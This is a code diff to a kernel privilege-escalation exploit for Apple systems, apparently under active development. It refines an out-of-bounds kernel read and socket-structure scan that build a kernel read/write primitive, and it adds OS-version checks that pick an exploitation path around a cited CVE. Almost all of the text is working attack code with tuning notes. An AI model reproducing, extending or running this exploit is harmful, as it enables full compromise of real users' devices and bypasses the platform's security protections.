@@ -101,6 +101,7 @@ kern_return_t cs2_pe_v1(void) {
     /* OG restore: no churn inventions (note-252 law — OG launches only free_thread) */
     /* pass-2 wedge law: fire #2 froze at pass-2's first read after a fully
        healthy pass-1 (1.6M one-shot maps). Decode pending — tonight: one pass. */
+    bool success = false;
     for (size_t pass = 0; pass < 1; pass++) {
         {
             struct task_vm_info tvi; mach_msg_type_number_t tc = TASK_VM_INFO_COUNT;
@@ -163,7 +164,7 @@ kern_return_t cs2_pe_v1(void) {
         LOG("start_pcb_id: %#llx", start_pcb_id);
         LOG("end_pcb_id: %#llx", end_pcb_id);
 
-        bool success = false;
+        success = false;
         // 8 search mappings
         for (size_t s = 0; s < search_mappings_count; s++) {
             mach_vm_address_t search_mapping_address = search_mappings[s];
@@ -250,7 +251,13 @@ kern_return_t cs2_pe_v1(void) {
         }
     }
 
-    LOG("scan exhausted: 1 pass (pass-2 wedge law), no corruption accepted, oob_read kr-fails=%lu — one tap per fresh boot", oob_read_fail_count);
+    if (!success) {
+        LOG("scan exhausted: 1 pass (pass-2 wedge law), no corruption accepted, oob_read kr-fails=%lu success_read_count=%llu — one tap per fresh boot",
+            oob_read_fail_count, (unsigned long long)cs2_ctx.success_read_count);
+        free(read_buffer);
+        free(write_buffer);
+        return KERN_FAILURE;
+    }
     free(read_buffer);
     free(write_buffer);
     return KERN_SUCCESS;
@@ -320,6 +327,10 @@ kern_return_t cs2_pe(void) {
     // we have stable rw, we can close the fds now
     close(cs2_ctx.write_fd);
     close(cs2_ctx.read_fd);
+    if (cs2_ctx.rw_socket_pcb == 0 || cs2_ctx.control_socket <= 0) {
+        LOG_ERR("no pcb / control socket after scan — skip kernel_base walk (kaddr 0x20 is inpcb field# garbage)");
+        return KERN_FAILURE;
+    }
     cs2_ctx.control_socket_pcb = cs2_early_kread64(cs2_ctx.rw_socket_pcb + koffsetof(inpcb, list_next));
 
     uint64_t textPtr = 0;
@@ -384,6 +395,26 @@ int cs2_run(void) {
     cs2_ctx.oob_offset = 0x100;
     cs2_ctx.oob_size = 0xf00;
     cs2_ctx.n_of_oob_pages = 2;
+    cs2_ctx.copy_confusion_lane = 0;
+    {
+        char osv[32] = {0};
+        size_t ol = sizeof(osv);
+        if (sysctlbyname("kern.osversion", osv, &ol, NULL, 0) == 0) {
+            int major = 0;
+            char train = 0;
+            if (sscanf(osv, "%2d%c", &major, &train) >= 2) {
+                /* CVE-2025-43520 patched 18.7.2 / 26.1 → 23B+ and 24A+.
+                   Live 24A435: pwritev returns length, never EFAULT. */
+                if (major >= 24 || (major == 23 && train >= 'B'))
+                    cs2_ctx.copy_confusion_lane = 1;
+            }
+        }
+    }
+    if (cs2_ctx.copy_confusion_lane)
+        LOG("lane: 27.0 copy-confusion (success pwritev + %#llx iov). hop-1 KEEP CLOSED. not CS verbatim.",
+            (unsigned long long)vm_page_size);
+    else
+        LOG("lane: OG EFAULT (w==-1) — 43520-viable train");
 
     arc4random_buf(&cs2_ctx.random_marker, sizeof(cs2_ctx.random_marker));
     arc4random_buf(&cs2_ctx.wired_page_marker, sizeof(cs2_ctx.wired_page_marker));
